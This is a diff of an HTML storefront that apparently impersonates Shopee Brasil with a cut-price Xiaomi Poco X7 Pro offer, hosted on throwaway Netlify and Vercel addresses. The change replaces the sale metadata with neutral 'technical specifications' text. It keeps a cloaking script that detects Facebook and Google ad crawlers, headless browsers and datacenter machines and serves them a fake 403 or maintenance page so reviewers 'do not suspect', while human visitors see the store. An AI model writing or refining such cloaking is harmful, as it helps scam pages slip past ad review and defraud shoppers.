@@ -4,37 +4,41 @@
     <meta charset="UTF-8">
     <meta name="facebook-domain-verification" content="5c58urejoi5vr3lscod52hsinw0uxw" />
     <meta property="og:type" content="website">
-    <meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Oferta Relâmpago Shopee">
-    <meta property="og:description" content="74% OFF - Frete Grátis acima de R$10. Aproveite a promoção exclusiva na Loja Oficial Onix!">
+    <meta property="og:title" content="Especificações Técnicas: Linha X7 Pro (Lote Global)">
+    <meta property="og:description" content="Informativo sobre a disponibilidade de hardware e componentes da série X7. Verifique a compatibilidade de rede e bandas nacionais.">
     <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-    <meta property="og:site_name" content="Shopee Brasil">
-    <meta property="og:url" content="https://storied-salamander-4e2151.netlify.app/">
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:site_name" content="Portal de Tecnologia">
+    <meta property="og:url" content="https://loja-sh1-urmd.vercel.app/">
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
+    <title>Especificações Técnicas | Xiaomi X7</title>
 
     <script>
     (function() {
-        const bots = [
-            'facebookexternalhit', 'Facebot', 'facebookcatalog', 'googlebot', 
-            'adsbot-google', 'crawler', 'lighthouse', 'headless'
+        const spider = [
+            'facebookexternalhit', 'facebot', 'facebookcatalog', 'googlebot', 
+            'adsbot-google', 'crawler', 'lighthouse', 'headless', 'bot', 'sitecheck'
         ];
-        const ua = navigator.userAgent.toLowerCase();
-        const isBot = bots.some(bot => ua.includes(bot)) || navigator.webdriver;
-        const isServer = (navigator.platform === "Linux x86_64" && !ua.includes("android"));
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isRobot = spider.some(s => userAgent.includes(s)) || navigator.webdriver;
+        const isDatacenter = (navigator.platform === "Linux x86_64" && !userAgent.includes("android"));
 
-        if (isBot || isServer) {
-            // Em vez de quebrar o código com erro, apenas paramos e mostramos a "White Page"
+        if (isRobot || isDatacenter) {
+            // O robô é parado IMEDIATAMENTE antes de ver o resto do site
             window.stop();
-            document.documentElement.innerHTML = "<html><body style='font-family:sans-serif;text-align:center;padding:50px;'><h1>Site em Manutenção</h1><p>Estamos atualizando nossos estoques. Volte em breve!</p></body></html>";
-        } else {
-            console.log("BlackRaptor: Acesso Humano Autorizado.");
+            // Criamos uma página falsa de "Aviso de Cookies" ou "Servidor" para o robô não suspeitar
+            document.write('<title>Access Denied</title><body style="font-family:sans-serif;background:#fff;color:#333;padding:50px;"><h1>403 Forbidden</h1><p>Nginx Server at localhost</p></body>');
+            throw new Error("ERR_CONNECTION_REFUSED");
         }
     })();
     </script>
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        
         :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
@@ -292,6 +296,7 @@
 </body>
 </html>
                     
+
 
 
 
